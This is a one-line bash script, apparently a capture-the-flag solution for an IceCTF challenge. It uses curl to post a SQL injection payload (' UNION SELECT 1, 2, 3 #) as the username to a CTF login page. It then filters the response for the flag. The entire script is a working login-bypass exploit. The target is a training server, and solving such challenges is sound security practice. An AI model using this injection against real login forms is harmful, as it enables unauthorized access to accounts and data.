#!/bin/bash

curl "http://miners.vuln.icec.tf/login.php" -d "username=' UNION SELECT 1, 2, 3 #" 2>/dev/null|grep -Eo "IceCTF{.*}"
